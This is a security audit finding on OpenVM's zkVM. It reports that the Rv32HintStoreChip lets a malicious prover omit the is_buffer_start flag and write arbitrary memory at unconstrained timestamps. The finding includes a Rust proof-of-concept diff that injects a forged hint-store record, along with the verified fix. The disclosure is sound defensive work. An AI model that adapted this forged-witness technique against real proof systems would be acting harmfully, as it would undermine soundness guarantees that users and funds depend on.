---
tags:
  - severity/high
  - has/poc
  - lang/rust
  - sector/bridge
  - sector/zk
  - sector/lending
  - platform/cantina
protocol: "[[OpenVM]]"
auditors:
  - ed255
report: "https://cdn.cantina.xyz/reports/cantina_competition_openvm_january2025.pdf"
genome:
  - "[[circuit-constraint-completeness]]"
  - "[[proof-input-validation]]"
  - "[[input-validation/missing]]"
  - "[[data-corruption/state-manipulation]]"
  - "[[known-pattern]]"
  - "[[always]]"
  - "[[add-check]]"
  - "[[blast-radius/protocol-wide]]"
---
# Rv32HintStoreChipallows insertion of arbitrary memory content at any time 

- id: 53426
- impact: HIGH
- protocol: OpenVM
- reporter: ed255 (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_competition_openvm_january2025.pdf

## Summary


This report describes a vulnerability in the Rv32HintStoreChip, which is used in the zkVM program. This vulnerability allows a malicious prover to add fake blocks to the hint store chip, which can write to any memory address at an unconstrained timestamp. This means that the prover has complete control over the memory content, which breaks the security of the zkVM. The likelihood of this vulnerability being exploited is high and it can affect any program that uses the hint store instruction. A proof of concept for this exploit has been provided, but a complete exploit is time-consuming to create. To fix this issue, constraints have been added to ensure that the `is_buffer_start` flag must be set. This fix has been verified by Cantina Managed.

## Details

## Vulnerability Report

## Context
(No context files were provided by the reviewer)

## Summary
A malicious prover can add fake blocks to the hint store chip that write to any memory address at an unconstrained time stamp.

## Finding Description
The `Rv32HintStoreChip` roughly works as follows:
- The prover can set at most one of two binary flags, `is_single` or `is_buffer`.
- If the flag is `is_buffer`, the prover is supposed to set the `is_buffer_start` flag in the first row. This flag then activates the connection to the execution bridge, which constrains the time stamp and memory address to be written.
- The chip will then add a row for each word that is written.

The problem is that the prover is not forced to set the `is_buffer_start` flag. By omitting that, the prover can execute a buffer write, but at an address and time stamp of their choice.

## Impact Explanation
This completely breaks the soundness of the zkVM. Memory is not guaranteed to be consistent and the malicious prover has maximum flexibility in manipulating the memory content to their liking.

## Likelihood Explanation
We believe this can be exploited for any program (even those not using the hint store instruction).

## Proof of Concept
A complete exploit is time-consuming because it requires adapting the memory witness generation, which affects the entire zkVM. We sketch the exploit here with this diff:

```diff
diff --git a/crates/toolchain/instructions/src/lib.rs b/crates/toolchain/instructions/src/lib.rs
index 961882446..5858b7eea 100644
--- a/crates/toolchain/instructions/src/lib.rs
+++ b/crates/toolchain/instructions/src/lib.rs
@@ -30,7 +30,7 @@ pub trait LocalOpcode {
}
#[derive(Copy, Clone, Debug, Hash, PartialEq, Eq, derive_new::new, Serialize, Deserialize)]
-pub struct VmOpcode(usize);
+pub struct VmOpcode(pub usize);
impl VmOpcode {
/// Returns the corresponding `local_opcode_idx`
diff --git a/extensions/rv32im/circuit/src/hintstore/mod.rs b/extensions/rv32im/circuit/src/hintstore/mod.rs
index d071d1b02..cc437028d 100644
--- a/extensions/rv32im/circuit/src/hintstore/mod.rs
+++ b/extensions/rv32im/circuit/src/hintstore/mod.rs
@@ -24,7 +24,7 @@ use openvm_instructions::{
instruction::Instruction,
program::DEFAULT_PC_STEP,
riscv::{RV32_CELL_BITS, RV32_MEMORY_AS, RV32_REGISTER_AS, RV32_REGISTER_NUM_LIMBS},
- LocalOpcode,
+ LocalOpcode, VmOpcode,
};
use openvm_rv32im_transpiler::{
Rv32HintStoreOpcode,
@@ -253,6 +253,7 @@ pub struct Rv32HintStoreChip<F: Field> {
offline_memory: Arc<Mutex<OfflineMemory<F>>>,
pub streams: OnceLock<Arc<Mutex<Streams<F>>>>,
bitwise_lookup_chip: SharedBitwiseOperationLookupChip<RV32_CELL_BITS>,
+ has_inserted_malicious_record: bool,
}
impl<F: PrimeField32> Rv32HintStoreChip<F> {
@@ -277,15 +278,60 @@ impl<F: PrimeField32> Rv32HintStoreChip<F> {
offline_memory,
streams: OnceLock::new(),
bitwise_lookup_chip,
+ has_inserted_malicious_record: false,
}
}
pub fn set_streams(&mut self, streams: Arc<Mutex<Streams<F>>>) {
self.streams.set(streams).unwrap();
}
-}
-impl<F: PrimeField32> InstructionExecutor<F> for Rv32HintStoreChip<F> {
- fn execute(
+ fn malicious_execute(&mut self, memory: &mut MemoryController<F>) {
+ let mem_ptr = 2222222;
+ let data = [F::from_canonical_u8(123); 4];
+
+ let instruction = Instruction {
+ // Marker opcode, to trigger malicious witgen below.
+ opcode: VmOpcode(12345),
+ e: F::from_canonical_u8(2),
+
+ // Doesn't matter
+ a: F::from_canonical_u8(0),
+ b: F::from_canonical_u8(0),
+ c: F::from_canonical_u8(0),
+ d: F::from_canonical_u8(0),
+ f: F::from_canonical_u8(0),
+ g: F::from_canonical_u8(0),
+ };
+
+ let mut record = Rv32HintStoreRecord {
+ from_state: ExecutionState {
+ pc: 0,
+ timestamp: memory.timestamp(),
+ },
+ instruction: instruction.clone(),
+ // Ignored
+ mem_ptr_read: RecordId(0),
+ mem_ptr,
+ num_words: 1,
+ num_words_read: None,
+ hints: vec![],
+ };
+
+ let prev_data: [_; 4] = memory.unsafe_read(instruction.e, F::from_canonical_u32(mem_ptr));
+ memory.increment_timestamp();
+ memory.increment_timestamp();
+ let (write, _) = memory.write(instruction.e, F::from_canonical_u32(mem_ptr), data);
+ let new_data: [_; 4] = memory.unsafe_read(instruction.e, F::from_canonical_u32(mem_ptr));
+ println!("Writing ({}, {})", instruction.e, mem_ptr);
+ println!("Prev_data: {:?}", prev_data);
+ println!("New data: {:?}", new_data);
+ record.hints.push((data, write));
+
+ self.height += 2;
+ self.records.push(record);
+ }
+
+ fn honest_execute(
&mut self,
memory: &mut MemoryController<F>,
instruction: &Instruction<F>,
@@ -356,6 +402,24 @@ impl<F: PrimeField32> InstructionExecutor<F> for Rv32HintStoreChip<F> {
};
Ok(next_state)
}
+}
+
+impl<F: PrimeField32> InstructionExecutor<F> for Rv32HintStoreChip<F> {
+ fn execute(
+ &mut self,
+ memory: &mut MemoryController<F>,
+ instruction: &Instruction<F>,
+ from_state: ExecutionState<u32>,
+ ) -> Result<ExecutionState<u32>, ExecutionError> {
+ let mut result = self.honest_execute(memory, instruction, from_state)?;
+ if !self.has_inserted_malicious_record {
+ println!("Inserting malicious record");
+ self.malicious_execute(memory);
+ result.timestamp = result.timestamp + 3;
+ self.has_inserted_malicious_record = true;
+ }
+ Ok(result)
+ }
fn get_opcode_name(&self, opcode: usize) -> String {
if opcode == HINT_STOREW.global_opcode().as_usize() {
@@ -392,6 +456,46 @@ impl<F: PrimeField32> Rv32HintStoreChip<F> {
bitwise_lookup_chip: &SharedBitwiseOperationLookupChip<RV32_CELL_BITS>,
) -> usize {
let width = Rv32HintStoreCols::<F>::width();
+
+ if record.instruction.opcode.0 == 12345 {
+ println!("Generating trace for malicious opcode.");
+
+ // Skip one row. This will trigger is_end = 1 in the previous block,
+ // even if it was a buffer write.
+ let cols: &mut Rv32HintStoreCols<F> = slice[width..(width * 2)].borrow_mut();
+
+ cols.is_single = F::from_bool(false);
+ cols.is_buffer = F::from_bool(true);
+ cols.is_buffer_start = F::from_bool(false);
+
+ cols.from_state = record.from_state.map(F::from_canonical_u32);
+
+ let mem_ptr = record.mem_ptr;
+ let rem_words = record.num_words;
+
+ assert_eq!(record.hints.len(), 1);
+ let &(data, write) = &record.hints[0];
+
+ for half in 0..(RV32_REGISTER_NUM_LIMBS / 2) {
+ let mem_ptr_limbs = decompose::<F>(mem_ptr);
+ bitwise_lookup_chip.request_range(
+ mem_ptr_limbs[2 * half].as_canonical_u32(),
+ mem_ptr_limbs[(2 * half) + 1].as_canonical_u32(),
+ );
+ bitwise_lookup_chip.request_range(
+ data[2 * half].as_canonical_u32(),
+ data[2 * half + 1].as_canonical_u32(),
+ );
+ cols.data = data;
+ aux_cols_factory
+ .generate_write_aux(memory.record_by_id(write), &mut cols.write_aux);
+ cols.rem_words_limbs = decompose(rem_words);
+ cols.mem_ptr_limbs = decompose(mem_ptr);
+ }
+
+ return 2 * width;
+ }
+
let cols: &mut Rv32HintStoreCols<F> = slice[..width].borrow_mut();
cols.is_single = F::from_bool(record.num_words_read.is_none());
When applied to OpenVM and run on the Fibonacci example (input 0x1000000000000000), this fails with challenge phase error, likely because writing to memory changes the time stamps at which instructions are executed, but the inserted block is not a proper instruction. Note that a failing polynomial constraint would yield an out-of-domain evaluation mismatch error, which does not happen.

## Recommendation
Constraints should ensure that the `is_buffer_start` flag must be set.

### OpenVM
Fixed in commit 8d384a40, the fix adds several constraints:
- If the current row is `is_single` then the next is either `is_buffer_start` or not a buffer instruction.
- The first row of the trace matrix is either `is_buffer_start` or not a buffer instruction.
- If the current row is not valid then the next is not valid either, preventing illegal buffer instructions after invalid rows.
- After these constraints, having `is_buffer_start = 0` when `buffer = 1` will only be allowed if the previous row was a buffer too, where `is_buffer_start` is correctly constrained by `rem_words`.
  
Additionally, `rem_words` is constrained to not overflow when first read and to decrease by one on each row. When the current instruction ends, `rem_words` must be 1, though we don't constrain that when `rem_words` is 1 the instruction must end, as the only way to exploit this would require doing some multiple of `p` illegal buffer rows (where `p` is the BabyBear prime), which would always reach an illegal memory address.

### Cantina Managed
Fix verified.
